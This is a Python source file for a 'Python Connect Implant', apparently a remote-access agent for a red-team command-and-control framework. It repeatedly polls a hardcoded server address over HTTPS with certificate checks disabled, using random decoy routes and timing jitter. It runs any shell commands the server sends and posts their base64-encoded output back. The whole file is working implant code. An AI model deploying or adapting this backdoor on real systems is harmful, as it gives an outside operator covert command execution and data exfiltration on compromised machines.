import argparse
import base64
import json
import random
import requests
import subprocess
import sys
import time
import urllib3

from collections import namedtuple

AgentOption = namedtuple('AgentOption', ['name', 'description', 'parameters','type'])
Parameter = namedtuple('Parameter', ['name', 'description'])

routes = ['the', 'bird', 'is', 'a', 'nerd', 'd', 'juice']

def base64_to_string(data) -> str:
    """
    Base64 decode a string.
    :param data: A base64 string.
    :return: A base64 decoded string
    :rtype: str
    """
    return base64.b64decode(data.encode('utf-8')).decode('utf-8')

def string_to_base64(data) -> str:
    """
    Base64 encode a string.
    :param data: A python string.
    :return: A base64 encoded string
    :rtype: str
    """
    return str(base64.b64encode(data.encode()), 'utf-8')

def post(url, data, route=''):
    if not route:
        route = routes[random.randint(0, len(routes) - 1)]
    return requests.post(f'https://192.168.1.15:8080/{route}', data, verify=False).text


def main(url, key):
    batch_response = ''
    check_in_task_id = ''
    while True:
        try:
            if not check_in_task_id:
                route = key
                data = ''
            else:
                route = ''
                data = json.dumps(batch_response)
            batch_request = json.loads(post(url, data, route=route))
        except Exception as e:
            batch_response = [{
                "connectrpc": "0.0.0",
                "error": {
                    "code":-32700,
                    "message": string_to_base64(str(e))
                },
                "id": check_in_task_id
            }]
            time.sleep(random.randint(5, 10))
            continue

        try:
            batch_response = []
            for task in batch_request:
                print(task)
                id = task['id']
                name = task['name']
                parameters = task['parameters']
                results = ''
                parameters = [base64_to_string(parameter) for parameter in parameters]
                try:
                    if name == 'check_in':
                        check_in_task_id = id
                        continue
                    if name == 'shell':
                        print(parameters)
                        results = subprocess.run(parameters, capture_output=True, text=True).stdout
                    if not results:
                        batch_response.extend([{
                            "connectrpc": "0.0.0",
                            "error": {
                                "code":-32601,
                                "message": string_to_base64(str(e))
                            },
                            "id": check_in_task_id
                        }])
                    batch_response.extend([{
                        "connectrpc": "0.0.0",
                        "result": string_to_base64(results),
                        "id": id
                    }])
                    
                except Exception as e:
                    batch_response.extend([{
                        "connectrpc": "0.0.0",
                        "error": {
                            "code":-32600,
                            "message": string_to_base64(str(e))
                        },
                        "id": check_in_task_id
                    }])
        except Exception as e:
            batch_response = [{
                "connectrpc": "0.0.0",
                "error": {
                    "code":-32700,
                    "message": string_to_base64(str(e))
                },
                "id": check_in_task_id
            }]
        batch_response.extend([{
            "connectrpc": "0.0.0",
            "result": 'checking in',
            "id": check_in_task_id
        }])
        time.sleep(random.randint(5, 10))

if __name__ == '__main__':
    parser = argparse.ArgumentParser('Python Connect Implant', 'Python Connect Implant', conflict_handler='resolve')
    parser.add_argument('url', metavar='url', help='Server URL')
    parser.add_argument('key', metavar='key', help='Implant Key')
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    sys.exit(main(args.url, args.key))